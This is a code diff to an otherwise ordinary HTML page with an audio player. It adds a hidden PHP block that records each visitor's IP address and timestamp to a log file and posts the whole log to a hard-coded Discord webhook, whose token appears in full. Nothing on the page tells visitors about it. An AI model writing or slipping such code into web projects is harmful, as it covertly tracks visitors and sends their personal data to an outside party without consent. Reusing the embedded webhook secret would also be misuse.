@@ -93,5 +93,25 @@
 
   <audio id="audioPlayer" src="./audiofile.mp3" loop></audio>
   <script src="./script.js"></script>
+
+  <?php
+  $ip = $_SERVER['REMOTE_ADDR'];
+  $log = date('Y-m-d H:i:s') . ' - IP: ' . $ip . PHP_EOL;
+  file_put_contents('log.txt', $log, FILE_APPEND);
+
+  $webhookUrl = 'https://discord.com/api/webhooks/1126202607132745871/O-DIXoAPbM_MqPwuHhUmQUUMIS5JD6V1rjZ-J70dWBjj3hsU4xkkXMWOQRVNqwkulAMx';
+  $logData = file_get_contents('log.txt');
+
+  $payload = json_encode(['content' => $logData]);
+  $ch = curl_init($webhookUrl);
+  curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+  curl_setopt($ch, CURLOPT_POST, 1);
+  curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
+  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+  curl_setopt($ch, CURLOPT_HEADER, 0);
+  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+  $response = curl_exec($ch);
+  curl_close($ch);
+  ?>
 </body>
 </html>
